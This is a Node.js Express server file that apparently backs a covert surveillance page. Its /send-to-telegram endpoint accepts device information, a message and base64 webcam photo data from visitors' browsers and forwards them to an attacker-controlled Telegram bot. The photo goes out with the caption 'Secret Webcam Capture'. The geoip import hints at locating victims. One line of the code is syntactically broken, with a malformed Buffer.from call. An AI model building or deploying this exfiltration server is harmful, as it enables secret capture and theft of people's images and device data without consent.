// server.js
require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const geoip = require('geoip-lite');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '50mb' }));
app.use(cors());

app.post('/send-to-telegram', async (req, res) => {
  try {
    const { deviceInfo, message, photoData } = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // First send the text message
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

    // If photo exists, send it
    if (photoData) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', Buffer.from(photoData.split(',')[1], 'base64', {
        filename: 'capture.jpg'
      });
      form.append('caption', '📸 Secret Webcam Capture');

      await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
        headers: form.getHeaders()
      });
    }

    res.status(200).send('OK');
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).send('Error');
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});